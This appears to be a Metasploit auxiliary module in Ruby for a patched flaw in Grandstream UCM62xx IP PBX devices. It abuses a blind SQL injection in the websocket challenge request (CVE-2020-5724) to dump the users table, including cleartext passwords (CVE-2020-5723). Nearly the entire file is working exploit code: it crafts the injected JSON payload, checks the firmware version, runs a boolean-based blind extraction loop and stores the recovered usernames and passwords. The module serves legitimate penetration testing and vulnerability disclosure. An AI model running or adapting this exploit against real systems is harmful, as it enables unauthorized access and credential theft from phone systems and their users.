##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Rex::Proto::Http::WebSocket
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::SQLi

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Grandstream UCM62xx IP PBX WebSocket Blind SQL Injection Credential Dump',
        'Description' => %q{
          This module uses a blind SQL injection (CVE-2020-5724) affecting the Grandstream UCM62xx
          IP PBX to dump the users table. The injection occurs over a websocket at the websockify
          endpoint, and specifically occurs when the user requests the challenge (as part of a
          challenge and response authentication scheme). The injection is blind, but the server
          response contains a different status code if the query was successful. As such, the
          attacker can guess the contents of the user database. Most helpfully, the passwords are
          stored in cleartext within the user table (CVE-2020-5723).

          This issue was patched in Grandstream UCM62xx IP PBX firmware version 1.20.22.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'jbaines-r7' # Vulnerability discovery, original poc, and Metasploit module
        ],
        'References' => [
          [ 'CVE', '2020-5724' ],
          [ 'CVE', '2020-5723'],
          [ 'URL', 'https://firmware.grandstream.com/Release_Note_UCM6xxx_1.0.20.22.pdf'],
          [ 'URL', 'https://raw.githubusercontent.com/tenable/poc/master/grandstream/ucm62xx/dump_http_user_creds.py']
        ],
        'DisclosureDate' => '2020-03-30',
        'DefaultOptions' => {
          'RPORT' => 8089,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/'])
    ])
  end

  # Craft the SQL injection into the challenge request
  def create_injection_request(query)
    id = Rex::Text.rand_text_alphanumeric(12)
    req = "{\"type\":\"request\",\"message\":{\"transactionid\":\"#{id}\",\"version\":\"1.0\",\"action\":\"challenge\",\"username\":\""
    req.concat("\' OR ")
    req.concat(query)
    req.concat('--"}}')
    req
  end

  # Retrieve the server's response and pull out the status response. The return value is
  # the server's response value (or 1 on failure).
  def recv_wsframe_status(wsock)
    res = wsock.get_wsframe
    return 1 unless res

    begin
      res_json = JSON.parse(res.payload_data)
    rescue JSON::ParserError
      fail_with(Failure::UnexpectedReply, 'Failed to parse the returned JSON response. ')
    end

    status = res_json.dig('message', 'status')
    return 1 if status.nil?

    status
  end

  # Extract the version from the cgi endpoint and return true if the
  # reported version is affected by the vulnerability.
  def vulnerable_version?
    normalized_uri = normalize_uri(target_uri.path, '/cgi')
    print_status("Requesting version information from #{normalized_uri}")
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalized_uri,
      'vars_post' => { 'action' => 'getInfo' }
    })

    return false unless res&.code == 200

    body_json = res.get_json_document
    return false if body_json.empty?

    prog_version = body_json.dig('response', 'prog_version')
    return false if prog_version.nil?

    print_status("The reported version is: #{prog_version}")

    version = Rex::Version.new(prog_version)
    version < Rex::Version.new('1.0.20.22')
  end

  def run_host(_ip)
    # do a version check so the attacker doesn't waste their time
    if !vulnerable_version?
      print_error('The reported version is not vulnerable.')
    end

    sqli = create_sqli(dbms: SQLitei::BooleanBasedBlind) do |payload|
      wsock = connect_ws(
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, '/websockify')
      )

      wsock.put_wstext(create_injection_request(payload))
      recv_wsframe_status(wsock) == 0
    end

    users = sqli.dump_table_fields('users', ['user_name', 'user_password'])
    users.each do |user|
      print_status("Found the following username and password: #{user[0]} - #{user[1]}")
      store_valid_credential(user: user[0], private: user[1])
    end
  end
end
